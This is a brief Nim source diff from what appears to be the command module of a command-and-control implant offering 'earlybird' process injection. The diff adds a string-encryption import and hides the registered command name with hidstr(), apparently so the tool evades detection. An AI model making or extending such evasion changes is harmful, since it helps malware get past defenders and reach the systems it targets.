@@ -5,6 +5,7 @@
 import std/[base64, json]
 import core/types
 import commands/registry
+import crypto/strenc
 
 when defined(windows):
   # ---------------------------------------------------------------------------
@@ -198,4 +199,4 @@ proc earlybirdExecute(taskId: string, params: JsonNode, state: AgentState,
     )
 
 proc initEarlyBird*() =
-  register("earlybird", earlybirdExecute)
+  register(hidstr("earlybird"), earlybirdExecute)
